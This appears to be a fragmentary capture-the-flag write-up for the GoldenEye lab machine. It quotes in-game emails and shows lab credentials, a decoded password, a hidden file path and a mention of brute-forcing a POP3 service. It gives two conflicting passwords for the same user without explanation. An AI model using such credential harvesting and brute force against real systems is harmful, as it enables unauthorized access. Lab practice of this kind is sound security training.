//Boris, make sure you update your default password.

//Be on the lookout for any suspicious network traffic....

Boris's password is weak and his password is encoded below.

Password for boris: InvincibleHack3r

The encoding method used was HTML Entity method.

After going to /sev-home/ it asks for username and password

we can login as boris.

and we get here



GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system

Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port

Boris

So the password for boris is secret1!

LEts check the pop3 server.

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

So Xenia seems to be a newcomer,oh then they might send some credentials to her account.
Lets try another brute force attack

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
